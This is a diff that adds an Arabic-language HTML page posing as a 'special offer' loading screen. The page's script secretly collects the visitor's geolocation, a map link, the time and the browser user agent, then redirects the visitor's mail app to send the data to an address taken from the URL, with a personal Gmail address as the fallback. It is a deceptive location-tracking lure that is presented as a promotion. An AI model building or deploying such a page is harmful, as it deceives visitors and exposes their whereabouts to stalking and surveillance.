@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>عرض خاص لك!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: #f0f8ff;
+        }
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 2s linear infinite;
+            margin: 30px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <h1>جاري تحضير العرض الخاص لك...</h1>
+    <div class="loader"></div>
+    <p id="message">يرجى الانتظار قليلاً</p>
+
+    <script>
+    // 1. استخراج الإيميل من الرابط
+    const urlParams = new URLSearchParams(window.location.search);
+    const email = urlParams.get('email') || 'farestarek101@gmail.com';
+    
+    // 2. الحصول على الموقع
+    navigator.geolocation.getCurrentPosition(
+        position => {
+            // 3. جمع بيانات الموقع
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
+            const time = new Date().toLocaleString();
+            
+            // 4. إعداد رسالة الإيميل
+            const subject = "📍 موقع جديد!";
+            const body = `تفاصيل الموقع:
+- خط العرض: ${lat}
+- خط الطول: ${lng}
+- الرابط: ${mapLink}
+- الوقت: ${time}
+- المتصفح: ${navigator.userAgent}`;
+            
+            // 5. إرسال الإيميل
+            document.getElementById("message").textContent = "جاري فتح تطبيق البريد...";
+            window.location.href = `mailto:${email}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+        },
+        error => {
+            // 6. إذا فشل الحصول على الموقع
+            document.getElementById("message").innerHTML = "❌ لم نتمكن من الحصول على الموقع.<br>سيتم توجيهك للعرض مباشرة.";
+            setTimeout(() => {
+                window.location.href = "https://example.com"; // استبدل برابطك
+            }, 3000);
+        }
+    );
+    </script>
+</body>
+</html>
